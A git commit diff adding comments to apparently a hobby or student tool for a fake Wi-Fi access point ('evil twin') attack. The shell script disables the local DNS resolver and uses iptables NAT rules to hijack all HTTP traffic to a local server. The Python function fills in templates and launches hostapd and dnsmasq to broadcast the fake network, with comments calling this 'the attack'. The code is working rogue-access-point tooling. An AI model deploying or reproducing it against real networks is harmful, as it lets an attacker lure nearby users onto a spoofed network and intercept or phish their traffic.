e619888387653045ec01fc48d211f69aeb2dc95a
liel berniker <lielb101995@gmail.com>
2022-05-12 11:29:05 +0300

    add notes to the conf files and access point creation

--- configuration_files/prepare_ap.sh
+++ configuration_files/prepare_ap.sh
@@ -1,23 +1,37 @@
 #!/bin/sh
-
+# systemd-resolved is a system service that provides network name resolution to local applications
+# here we Disable and stop the systemd-resolved service which stop the local DNS stub listener that uses port 53
 systemctl stop systemd-resolved>/dev/null 2>&1
 systemctl disable systemd-resolved.service >/dev/null 2>&1
 systemctl mask systemd-resolved >/dev/null 2>&1
-    # Stop system network service
-    # os.system('service NetworkManager stop')
-
+ # set the current interface not to managed mode
 nmcli dev set ${INTERFACE} managed no
+# change the interface ip and netmask
 ifconfig ${INTERFACE} inet 10.0.0.1 netmask 255.255.255.0
+# define the default gateway
 route add default gw 10.0.0.1
 
+# port 80 is saved for http this is why we do a redirect to port 8080 so we will not need to give a
+# root privilege to the users that will use our server
+# IP forwarding/Internet routing - is a process used to determine which path a packet or datagram can be sent.
+#
 echo 1 > /proc/sys/net/ipv4/ip_forward
+# go to the nat table and filter the tcp packets, all packet match the destination of port 80 redirect it to port 8080
+# and redirect to the destination ip 10.0.0.1
 sudo iptables --table nat --append PREROUTING --protocol tcp --dport 80 --jump REDIRECT --to-port 8080
 sudo iptables --table nat --append PREROUTING --protocol tcp --dport 80 --jump DNAT --to-destination '
         '10.0.0.1:8080
+
+# if you want to process packets as they leave your system, but without doing any NAT or MANGLE(ing),
+# you’ll look to the OUTPUT chain within the FILTER table
+# here we
 sudo iptables --table nat --append OUTPUT --protocol tcp --dport 80 --jump REDIRECT --to-port 8080
 sudo iptables --table nat --append OUTPUT --protocol tcp --dport 80 --jump DNAT --to-destination 10.0.0.1:8080
-
+#in iptables the POSTROUTING is: Right before leaving an interface in the packet traffic
+# here we set it to our interface
 sudo iptables --table nat --append POSTROUTING --out-interface ${INTERFACE} --jump MASQUERADE
+# Enable forwarding
 sudo iptables -P FORWARD ACCEPT
+
 sudo iptables -A INPUT -j ACCEPT >> /dev/null 2>&1
 sudo iptables -A OUTPUT -j ACCEPT >> /dev/null 2>&1
--- create_ap.py
+++ create_ap.py
@@ -4,44 +4,46 @@ from string import Template
 
 
 def change_template(path, interface, ssid_name):
+    # this function replace all the INTERFACE and SSID_NAME mentioned In the file from tha path by interface and
+    # ssid_name
+
+    #open file
     with open(path, 'r+') as f:
         template = Template(f.read())
         f.seek(0)
+        # replace all INTERFACE and SSID_NAME in file by template substitute
         f.write(template.substitute(INTERFACE=interface, SSID_NAME=ssid_name))
         f.truncate()
 
 
-def interface_change_mode(interface):
-    # Start system network service
-    # os.system('service NetworkManager start')
-    os.system('nmcli dev set ' + interface + ' managed yes')
-
-
 def prepare_fake_access_point(interface, ssid_name):
     """
-    prepare the environment setup for creating the fake access point
-    :param access_point_bssid represent the network name
+    first the function reboot all needed requirements for the attack
+     by stop the hostapd, dnsmasq and by set all the configuration and sh files
+     then set the ip tables settings for the attack
+     then run the server , the access point by hostapd and by the dnsmasq
     """
+
+    # run the reboot sh file
     os.system('sudo sh configuration_files/reboot.sh')
+    # create a copy of the configuration and sh files and edit them by the information from the attack
     os.system('rm -rf build_up/')
     os.system('cp -r configuration_files build_up')
     change_template('build_up/hostapd.conf', interface, ssid_name)
     change_template('build_up/dnsmasq.conf', interface, ssid_name)
     change_template('build_up/prepare_ap.sh', interface, ssid_name)
+    # run a sh file that edit the settings for the attack
     os.system('sudo sh build_up/prepare_ap.sh')
     print("finish prepare conf files")
     print("run fake ap")
+    # run the fake access point by hostapd and dnsmasq
     os.system('sudo sh build_up/run_ap.sh')
     time.sleep(120)
+    # set the current interface back to managed mode
     os.system('nmcli dev set ' + interface + ' managed yes')
     os.system('sudo sh configuration_files/reboot.sh')
 
 
-
-
-
-# if __name__ == "__main__":
-#     prepare_fake_access_point("wlp1s0", "ssid_name")
 
   
     
